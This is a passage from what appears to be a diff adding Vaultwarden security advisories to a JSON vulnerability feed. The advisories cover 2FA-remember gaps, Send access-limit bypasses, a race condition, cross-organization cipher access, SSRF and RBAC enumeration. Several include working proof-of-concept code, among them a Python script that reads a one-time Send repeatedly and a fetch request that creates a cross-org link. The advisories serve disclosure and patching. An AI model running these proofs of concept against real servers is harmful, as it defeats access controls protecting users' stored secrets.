```rust\r\n  async fn remove_2fa(user_id: UserId, token: AdminToken, conn: DbConn) -> EmptyResult {\r\n      let mut user = get_user_or_404(&user_id, &conn).await?;\r\n      TwoFactor::delete_all_by_user(&user.uuid, &conn).await?;\r\n      two_factor::enforce_2fa_policy(&user, &ACTING_ADMIN_USER.into(), 14, &token.ip.ip, &conn).await?;\r\n      user.totp_recover = None;\r\n      user.save(&conn).await\r\n  }\r\n  ```\r\n\r\n- Residual gap B: `src/api/core/organizations.rs` `recover_account` (function starts at line 3009): with `resetMasterPassword=false, resetTwoFactor=true` - the \"strip the attacker's 2FA only\" option - `TwoFactor::delete_all_by_user` runs at line 3073, but the security-stamp rotation chain (which does clear remember tokens) lives inside the `reset_master_password` branch (around line 3060) and is not entered.\r\n\r\n- Full sweep: of the five `TwoFactor::delete_all_by_user` call sites in `src/`, exactly these two do not clear `twofactor_remember` (the account-deletion site is not applicable; emergency-access takeover triggers `set_password(..., reset_security_stamp=true)` and is covered).\r\n\r\n- Why this is a gap rather than intended behavior: the remember check (`src/api/identity.rs:877-893`) only compares the device's stored `twofactor_remember` constant-time plus the JWT binding - it is not bound to the current set of second factors. The fix commit itself states the invariant: \"No device may keep skipping 2FA once every second factor is gone.\"\r\n\r\nDeduplication: the project's published advisories (CVE-2025-24898, CVE-2025-25188 - both dependency-layer fixes) and older attachment/invite/admin-panel issues do not touch 2FA-remember revocation completeness.\r\n\r\n## PoC\r\n\r\nEnvironment: Docker (image `vaultwarden/server:latest`, version 1.37.3), Python 3. No external dependencies (stdlib only).\r\n\r\n```\r\ndocker run -d --name vw-audit -p 18080:80 \\\r\n  -e SIGNUPS_ALLOWED=true -e ADMIN_TOKEN='audittoken-7f3a9c' \\\r\n  -e IN...",
+      "published_at": "2026-10-28T18:00:11.000Z",
+      "modified_at": "2026-10-28T18:00:11.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.8,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-287",
+        "CWE-613"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-7jg8-8m5x-6j9r",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-7jg8-8m5x-6j9r",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-7jg8-8m5x-6j9r",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b4c84c1ee9ce8e793205e4287342d6169899f8d37ad51a3177cce04d29a6b95a",
+      "note": null
+    },
+    {
+      "id": "GHSA-wc45-m6pv-rrf9",
+      "aliases": [],
+      "title": "Send access limits not enforced on the new Send access endpoints",
+      "summary": "### Summary\r\n\r\n> **Pre-release only.** The affected code was only on the development branch (and the `:testing` image) between commits `5c5e8e1a` (#7346) and `46ae59ea` (#7472). It was never part of a tagged release: 1.36.0 predates it and 1.37.0 shipped with the fix.\r\n\r\nThe anonymous Send access endpoints introduced by the 2026.6.0 rewrite do not enforce a Send's access limits. Anyone holding a Send link can read a \"one-time\" (or `max_access_count=N`) Send many more times than allowed, and can keep reading it after the creator disables it or it expires. Meanwhile the creator's access counter under-reports the real number of reads. The `max_access_count`, `expiration_date`, `deletion_date`, and `disabled` guarantees of Send are effectively defeated.\r\n\r\n### Details\r\n\r\nThe rewrite split anonymous access into two steps: get a 2-minute `send_access` token (`POST /identity/connect/token`, `grant_type=send_access`), then read the Send with it (`POST /api/sends/access` for text, `POST /api/sends/access/file/<file_id>` for files).\r\n\r\nAll limit enforcement was moved into token **issuance**. `SendTokens::generate_tokens` (`src/auth/send.rs:82-117`) checks `max_access_count`/`expiration_date`/`deletion_date`/`disabled`/password and does `access_count += 1` **once** (`:116`). The access handlers `process_access` (`src/api/core/sends.rs:516`) and `process_access_file` (`:592`) then re-check **nothing** and **never** increment `access_count`:\r\n\r\n```rust\r\n// src/api/core/sends.rs:592 (no checks, no increment)\r\nasync fn process_access_file(send: Send, file_id: SendFileId, host: Host, conn: DbConn, nt: Notify<'_>) -> JsonResult {\r\n    nt.send_send_update(...).await;\r\n    Ok(Json(json!({ \"url\": download_url(&host, &send.uuid, &file_id).await? })))\r\n}\r\n// The legacy handlers, retained in the same file (sends.rs:557-585), still check\r\n// expiration/deletion/disabled/password and do `send.access_count += 1` on every access.\r\n```\r\n\r\nThe `send_access` JWT (`BasicJwtClaims`) has no `jti`/nonce, so it is a replayable bearer for its full 2-minute lifetime. Consequences:\r\n\r\n- `access_count` counts **tokens issued, not reads**, so a `max_access_count=N` Send yields N tokens, each granting unlimited reads in its window, and the creator's `accessCount` shows only N.\r\n- A Send **disabled or expired mid-window stays readable** through an already-issued token.\r\n\r\n### PoC\r\n\r\nCreate a **File Send** with **Maximum Access Count = 1** in your vault. Set `SEND_ID` (its UUID, from the share link), `FILE_ID` (from `GET /api/sends`), and `VW` (your server), then run:\r\n\r\n```python\r\nimport json, os, base64, uuid, urllib.request, urllib.error, urllib.parse\r\nBASE, SEND_ID, FILE_ID = os.environ[\"VW\"], os.environ[\"SEND_ID\"], os.environ[\"FILE_ID\"]\r\n\r\ndef http(method, path, hdr=None, form=None):\r\n    body = urllib.parse.urlencode(form).encode() if form else None\r\n    h = {\"User-Agent\": \"vw1\"} | (hdr or {})\r\n    if form: h[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\r\n    try:  r = urllib.request.urlopen(urllib.request.Request(BASE + path, body, h, method=method), timeout=30); return r.status, r.read()\r\n    except urllib.error.HTTPError as e: return e.code, e.read()\r\n\r\nsid = base64.urlsafe_b64encode(uuid.UUID(SEND_ID).bytes).decode().rstrip(\"=\")\r\n_, b = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\ntok = {\"Authorization\": \"Bearer \" + json.loads(b)[\"access_token\"]}          # the ONE access the max=1 Send allows\r\ns, _ = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\nprint(f\"[1] 2nd token issuance -> HTTP {s} (blocked: the max=1 cap fires only here, at issuance)\")\r\nfor i in range(1, 6):                                                        # ...yet ONE token reads the file 5x\r\n    s, _ = http(\"POST\", f\"/api/sends/access/file/{FILE_ID}\", hdr=tok)\r\n    print(f\"[2] download #{i} -> HTTP {s}\")\r\ninput(\"[3] now Disable the Send in your vault...",
+      "published_at": "2026-10-03T20:58:42.000Z",
+      "modified_at": "2026-10-03T21:02:33.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "1.36.0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-wc45-m6pv-rrf9",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wc45-m6pv-rrf9",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-wc45-m6pv-rrf9",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:cb287f4752a83f058666227d5fcf5cff1f9d159ebe6163a9494d5f66f7ff4d21",
+      "note": null
+    },
+    {
+      "id": "GHSA-rxhg-2pw9-vf25",
+      "aliases": [],
+      "title": "Send max_access_count can be exceeded by concurrent access requests",
+      "summary": "### Summary\r\n\r\nVaultwarden does not enforce a Send's `max_access_count` atomically. The access-count check and the increment are separate operations, so concurrent requests can all pass the check before any of them writes, allowing more accesses than the sender configured.\r\n\r\n### Details\r\n\r\n**File:** `src/api/core/sends.rs`\r\n\r\nBoth Send access endpoints read `access_count`, compare it against `max_access_count`, then write `access_count + 1` as a separate operation, with no database-level locking:\r\n\r\n```rust\r\n// Read (check):\r\nif let Some(max_access_count) = send.max_access_count\r\n    && send.access_count >= max_access_count { ... }\r\n// Write (increment - separate DB operation):\r\nsend.access_count += 1;\r\nsend.save(&conn).await?;\r\n```\r\n\r\nTwo concurrent requests against a Send at `access_count = 0, max_access_count = 1`: both read `0`, both pass the check, and both write `access_count = 1`. Both return the secret - the text content for a text Send, or a signed download token for a file Send.\r\n\r\nThe write compounds the problem. `save()` persists the whole row from memory, so one request's stale in-memory value overwrites another's increment rather than adding to it. The stored counter can therefore under-report the number of accesses that actually succeeded.\r\n\r\n### Reproduction\r\n\r\nCreate a Send with `maxAccessCount: 1`, then issue many concurrent access requests for it. Before the fix, more than one request returns 200 while the stored `access_count` advances only once - the whole-row save overwriting the concurrent increment. After the fix, exactly one request succeeds and the rest return 404.\r\n\r\n### Impact\r\n\r\n- A Send capped at a given number of accesses can be accessed more times than configured, by anyone holding the Send link.\r\n- For text Sends, two parties can simultaneously claim the \"last\" access and both receive the content.\r\n- The sender's intent in setting `maxAccessCount` is not reliably enforced.\r\n\r\n### Fix\r\n\r\nFixed in 1.37.0 (`46ae59ea`, #7472). `Send::register_access` (`src/db/models/send.rs`) performs the check and the increment as a single conditional statement:\r\n\r\n```rust\r\ndiesel::update(sends::table)\r\n    .filter(sends::uuid.eq(uuid))\r\n    .filter(\r\n        sends::max_access_count\r\n            .is_null()\r\n            .or(sends::access_count.nullable().lt(sends::max_access_count)),\r\n    )\r\n    .set((sends::access_count.eq(sends::access_count + 1), sends::revision_date.eq(revision_date)))\r\n    .execute(conn)\r\n```\r\n\r\nZero affected rows means the limit was already reached, which every access path turns into the existing 404. In 1.37.0 one path still wrote the whole row: the legacy access route (`post_access_legacy`) called `save()` for file Sends, which could overwrite a concurrent increment.",
+      "published_at": "2026-10-03T20:58:17.000Z",
+      "modified_at": "2026-10-03T21:03:42.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-362"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-rxhg-2pw9-vf25",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-rxhg-2pw9-vf25",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-rxhg-2pw9-vf25",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-455c-vgg9-jxw8",
+      "aliases": [],
+      "title": "Failed cipher share leaves a cross-organization collection link that grants access to the cipher",
+      "summary": "### Summary\r\n  A Broken Access Control vulnerability in the share_cipher_by_uuid endpoint allows a user who belongs to multiple organizations to bypass strict cross-organization data isolation. By intentionally triggering a validation error during the cipher sharing process, an attacker can create an orphaned database link (CollectionCipher) that binds a cipher owned by Organization A to a collection located in Organization B. This bypasses tenant isolation: the link grants access to the Org A cipher through the Org B collection.\r\n\r\n  ### Details\r\n  The vulnerability is located in src/api/core/ciphers.rs within the share_cipher_by_uuid function.\r\n  When a user submits a PUT /api/ciphers/<cipher_id>/share request to share a cipher to an organization, the backend processes the request in two phases:\r\n   1. Link Creation: It iterates through the provided collectionIds, verifies write access, and immediately persists the mappings to the database via CollectionCipher::save(&cipher.uuid, &collection.uuid, conn).await?.\r\n   2. Cipher Update: It then calls update_cipher_from_data(...) to update the cipher's metadata and transfer its organization_uuid to the target organization.\r\n\r\n  The issue arises because these two steps are not wrapped in a database transaction.\r\n\r\n  If update_cipher_from_data encounters a validation error-for example, if the cipher already belongs to a different organization, causing the cipher.organization_uuid.is_some() && cipher.organization_uuid != data.organization_id check to fail-the function returns an error (HTTP 400). However, the CollectionCipher records saved in step 1 are not rolled back.\r\n\r\n  This leaves the database in an inconsistent state: a cipher belonging to Org A is permanently linked to a collection in Org B. The item is not listed in the sync of Org B members, but the per-cipher endpoints (for example `GET`/`PUT`/`DELETE /api/ciphers/<id>`) authorized access through collection membership without checking the cipher's organization. Anyone with access to that Org B collection who knew the cipher id could read, modify or delete it, including the attacker after being removed from Org A. The attacker needs write access to the cipher in Org A and to the target collection in Org B.\r\n\r\n### PoC\r\n```\r\nconst CIPHER_ID = \"aa1b4c10-99f9-47e2-8a86-8a1c9a8b7a73\";\r\nconst ORG_B_ID = \"9ca8dbb7-8e66-442a-a977-16523b876c52\";\r\nconst COL_ID_IN_ORG_B = \"c0e886da-1be5-4c6d-9221-0722eb3cea8a\";\r\n\r\nfetch(`https://localhost/api/ciphers/${CIPHER_ID}/share`, {\r\n \"headers\": {\r\n   \"accept\": \"application/json\",\r\n   \"content-type\": \"application/json\", \r\n   \"authorization\": \"Bearer ....\",\r\n   \"device-type\": \"10\",\r\n   \"is-prerelease\": \"1\",\r\n   \"Cache-Control\": \"no-store\",\r\n   \"Pragma\": \"no-cache\",\r\n   \"Bitwarden-Client-Name\": \"web\",\r\n   \"Bitwarden-Client-Version\": \"2026.4.1\",\r\n   \"Sec-GPC\": \"1\",\r\n   \"Sec-Fetch-Dest\": \"empty\",\r\n   \"Sec-Fetch-Mode\": \"cors\",\r\n   \"Sec-Fetch-Site\": \"same-origin\",\r\n   \"Priority\": \"u=4\"\r\n},\r\n\"method\": \"PUT\", \r\n\"body\": JSON.stringify({\r\n  cipher: {\r\n      type: 1,\r\n      name: \"Geleakter Org A Eintrag\",\r\n      organizationId: ORG_B_ID, // Der böse Org-Switch\r\n      notes: \"Gehört eigentlich Org A\"\r\n  },\r\n  collectionIds: [COL_ID_IN_ORG_B] // Die Collection in Org B\r\n})\r\n})\r\n.then(r => r.text()).then(console.log);\r\n\r\n```\r\n\r\n ### Patches\r\n  Fixed in 1.37.0, where the organization check runs before any collection link is written, so new cross-organization links can no longer be created.\r\n\r\n ### Impact\r\n  This is a Broken Access Control / Data Isolation Bypass vulnerability.\r\n  It impacts any multi-tenant instance where users belong to multiple organizations. An attacker can exploit this flaw to silently bridge data between isolated organizations. Furthermore, a member could keep access to an Org A item after being removed from Org A.\r\n\r\nAfter Exploit:\r\n<img width=\"723\" height=\"678\" alt=\"grafik\" src=\"https://github.com/user-attachments/assets/f06c9841-438c-44ac-917e-cc5f7777e109\" />\r\n\r\nView of a user w...",
+      "published_at": "2026-10-03T20:57:49.000Z",
+      "modified_at": "2026-10-03T21:03:26.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-284"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-455c-vgg9-jxw8",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-455c-vgg9-jxw8",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-455c-vgg9-jxw8",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-116678",
+      "aliases": [
+        "GHSA-hw4g-2v3f-74x5"
+      ],
+      "title": "Vaultwarden: Icon endpoint SSRF fix bypass via second-stage favicon IP literal URLs",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to version 1.37.0, the Vaultwarden icon downloader validates the initial icon host and DNS results but passes favicon URLs parsed from attacker-controlled HTML to get_page_with_referer() without applying should_block_host() to the second-stage host. This flaw bypasses the remediation for CVE-2026-47160, which covered decimal, hexadecimal, octal, and IPv4-mapped IPv6 host normalization, because the second-stage IP-literal favicon fetch does not invoke the custom DNS resolver. A remote unauthenticated attacker can provide a public page whose favicon uses an IP-literal URL, allowing the Vaultwarden server to reach loopback or private and internal addresses. The issue affects instances with internal icon downloading enabled and can expose internal responses that resemble supported images or reveal reachability through timing, status, and cache behavior. This issue is fixed in version 1.37.0.",
+      "published_at": "2026-10-03T20:05:28.000Z",
+      "modified_at": "2026-10-30T14:24:42.185Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.0033,
+        "percentile": 0.26468,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-hw4g-2v3f-74x5",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/7472",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/commit/46ae59eaf444f0ae0a799070cf2bd6c415284a51",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.37.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-116678",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-116678",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-116678",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-116678",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-hw4g-2v3f-74x5",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-hw4g-2v3f-74x5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-rqf8-2568-r7mc",
+      "aliases": [],
+      "title": "Manager-with-no-collections can enumerate org user/group → collection mappings (incomplete fix of GHSA-jjxg-p3v6-52ww)",
+      "summary": "### Summary\r\n\r\nGHSA-jjxg-p3v6-52ww / CVE-2026-33420 added a per-collection assignment filter to `get_org_collections_details` (and a `has_full_access()` short-circuit to `get_org_collections`) so that a Manager-role member with no collection assignments cannot enumerate the organization's user→collection mapping. The advisory text noted the fix is \"consistent with how `get_org_collections` behaves.\"\r\n\r\nTwo structurally-identical sibling handlers in the same file did NOT receive the equivalent guard. A Manager with `accessAll=false` and no collection assignments can still enumerate:\r\n\r\n- **BUG #1 - `get_members`** (`src/api/core/organizations.rs:936-963` in 1.36.0): `GET /api/organizations/<id>/users?includeCollections=true&includeGroups=true` returns the org-wide per-member collection assignments + per-member group memberships.\r\n- **BUG #2 - `get_groups_details`** (`src/api/core/organizations.rs:2445-2448` in 1.36.0): `GET /api/organizations/<id>/groups/details` returns each group's collection-permission mapping (group → collection ID + `readOnly` / `hidePasswords` / `manage` flags).\r\n\r\nTogether the pair lets the caller reconstruct the entire org-wide RBAC matrix (who → which collection, via direct grant or group inheritance) - exactly the information the parent CVE was assigned to protect.\r\n\r\nI'm reporting both as one advisory because they share root cause, remediation pattern, and threat actor.\r\n\r\n### Details\r\n\r\n**PATCHED reference - parent CVE pattern (`get_org_collections` line 386-401):**\r\n\r\n```rust\r\n#[get(\"/organizations/<org_id>/collections\")]\r\nasync fn get_org_collections(org_id: OrganizationId, headers: ManagerHeadersLoose, conn: DbConn) -> JsonResult {\r\n    if org_id != headers.membership.org_uuid {\r\n        err!(\"Organization not found\", \"Organization id's do not match\");\r\n    }\r\n    if !headers.membership.has_full_access() {                                                          // ← the patch\r\n        err_code!(\"Resource not found.\", \"User does not have full access\", rocket::http::Status::NotFound.code);\r\n    }\r\n    ...\r\n}\r\n```\r\n\r\n**UNPATCHED in 1.36.0 - `get_members` (line 936-963):**\r\n\r\n```rust\r\n#[get(\"/organizations/<org_id>/users?<data..>\")]\r\nasync fn get_members(data: GetOrgUserData, org_id: OrganizationId, headers: ManagerHeadersLoose, conn: DbConn) -> JsonResult {\r\n    if org_id != headers.membership.org_uuid {\r\n        err!(\"Organization not found\", \"Organization id's do not match\");\r\n    }\r\n    let mut users_json = Vec::new();\r\n    for u in Membership::find_by_org(&org_id, &conn).await {\r\n        users_json.push(\r\n            u.to_json_user_details(\r\n                data.include_collections.unwrap_or(false),\r\n                data.include_groups.unwrap_or(false),\r\n                &conn,\r\n            )\r\n            .await,\r\n        );\r\n    }\r\n    Ok(Json(json!({\"data\": users_json, \"object\": \"list\", \"continuationToken\": null})))\r\n}\r\n```\r\n\r\n`to_json_user_details(include_collections=true, include_groups=true, ...)` emits per-member collection + group assignments. No `has_full_access()` short-circuit.\r\n\r\n**UNPATCHED in 1.36.0 - `get_groups_details` (line 2445-2448):**\r\n\r\n```rust\r\n#[get(\"/organizations/<org_id>/groups/details\", rank = 1)]\r\nasync fn get_groups_details(org_id: OrganizationId, headers: ManagerHeadersLoose, conn: DbConn) -> JsonResult {\r\n    get_groups_data(true, org_id, headers, conn).await\r\n}\r\n```\r\n\r\n`get_groups_data(true, ...)` serializes each group with its collection-permission mapping. Same `ManagerHeadersLoose` header, no `has_full_access()` short-circuit.\r\n\r\n**Bitwarden upstream divergence:** the equivalent endpoints in `bitwarden/server` are gated at Admin / Owner via `ManageUsersRequirement` (for `/users`) and `ManageUsersOrGroupsRequirement` (for `/groups/details`). Vaultwarden's `ManagerHeadersLoose` on both handlers is the divergence - Bitwarden does not consider Manager-with-no-collections sufficient privilege for org-wide RBAC enumeration.\r\n\r\n### PoC\r\n\r\nLab: `vaultwarden/server:l...",
+      "published_at": "2026-10-03T20:05:15.000Z",
+      "modified_at": "2026-10-03T20:05:15.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-rqf8-2568-r7mc",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-rqf8-2568-r7mc",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-rqf8-2568-r7mc",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-88qc-6ch9-mc3j",
+      "aliases": [],
+      "title": "Directory-connector member import (ldap_import) skips org-policy enforcement (check_user_allowed), bypassing the Single-Organization and required-2FA policies",
+      "summary": "## Summary\r\nThe directory-connector / bulk member-import endpoint `POST /api/public/organization/import`\r\n(`src/api/core/public.rs`, `ldap_import`) activates and re-activates organization members **without\r\ncalling `OrgPolicy::check_user_allowed`** - the policy gate that every interactive\r\nmembership-activation path applies. A member admitted or re-admitted through directory sync is\r\ntherefore never checked against the organization's **Single-Organization** or **required-2FA**\r\npolicies. This is the one activation path missed by the fix for #1849.\r\n\r\n## Relationship to prior art (a precise incomplete-fix residual, not a rediscovery)\r\n- **#1849** (\"org two-step-login policy enforcement doesn't work\", CLOSED) is the fix this residual\r\n  belongs to: it added `OrgPolicy::check_user_allowed` to the interactive membership-activation\r\n  paths. **This report is the one activation path that fix missed** - the directory-connector import.\r\n- A separate report of mine is the **sibling instance of\r\n  the same pattern** - \"a check present on the primary path, absent on an alternate path.\" The two\r\n  together motivate a systemic audit of alternate entrypoints (see last section).\r\n- **#6780** (\"SSO user bypasses org 2FA\", OPEN) is an acknowledged **same-class** bypass on a\r\n  **different** path, confirming the maintainer treats this enforcement area as live.\r\n- A refresh-token / security-stamp advisory is **distinct** - a membership revoke does not rotate the\r\n  security stamp, so it does not cover this scenario (confirmed empirically on 1.36.0).\r\n\r\n## Affected versions\r\n- `1.36.0` and earlier - confirmed on 1.36.0.\r\n- Fixed in `1.37.0`: `ldap_import` now calls `OrgPolicy::check_user_allowed` after `restore()` and re-revokes members the policy disallows.\r\n- The `check_user_allowed` enforcement (added for #1849) covers the interactive activation paths but\r\n  was never added to the public-import path.\r\n\r\n## Root cause\r\nIssue #1849 was fixed by adding `OrgPolicy::check_user_allowed` to the membership-activation paths -\r\n`_confirm_invite` (`organizations.rs:1427`), `restore_member_impl` (`organizations.rs:2402`),\r\n`accept_org_invite`, `edit_member`, and the admin path. `check_user_allowed`\r\n(`src/db/models/org_policy.rs:283`) enforces **both** the Single-Organization policy and the\r\nrequired-2FA policy.\r\n\r\nThe directory-connector import endpoint `POST /api/public/organization/import`\r\n(`src/api/core/public.rs`, `ldap_import`) was missed: it re-Confirms a revoked member via\r\n`member.restore()` (~`public.rs:87`) **without calling `check_user_allowed`**. (New members are\r\ncreated as `Accepted` (~`public.rs:107-110`) and would still be checked at the admin `confirm` step;\r\nthe airtight bypass is the `restore()` → `Confirmed` path, which skips `confirm` entirely.)\r\n\r\n## Impact\r\n\r\n### Primary - Single-Organization policy bypass (needs no 2FA at all)\r\nA member who should be blocked/removed by the Single-Org policy is silently re-Confirmed via directory-connector\r\nimport, because the import path skips the `check_user_allowed` enforcement every interactive path\r\napplies. Clean policy bypass, no 2FA involved.\r\n\r\n### Demonstrated - required-2FA policy bypass (ring-6 chain)\r\nThe same missing check lets the import re-Confirm a member with **no 2FA** into a **required-2FA**\r\norg. The member then retains org-data access via the refresh-token grant (`identity.rs:refresh_login`),\r\nwhich - unlike `password_login`/`sso_login` - does not run `enforce_2fa_policy` (the revoke\r\nmechanism). The member is never re-revoked, so the owner's mandatory-2FA policy is defeated for them.\r\n\r\nReproduced on a fresh self-hosted instance (vaultwarden 1.36.0 / main `d6a3d53`):\r\n\r\n| Step | Action | Member status / access |\r\n|---|---|---|\r\n| 1 | Member M Confirmed, no 2FA, has collection access | `Confirmed`; sync returns 1 org cipher |\r\n| 2 | M password-login (policy off) | refresh token captured |\r\n| 3 | Owner enables required-2FA policy | -> Revoked (enforcement works at enable-ti...",
+      "published_at": "2026-10-03T20:05:00.000Z",
+      "modified_at": "2026-10-03T20:05:00.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-88qc-6ch9-mc3j",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-88qc-6ch9-mc3j",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-88qc-6ch9-mc3j",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-xwf8-pjh7-h589",
+      "aliases": [],
+      "title": "Cross-organization full cipher access via unguarded full-access-group query",
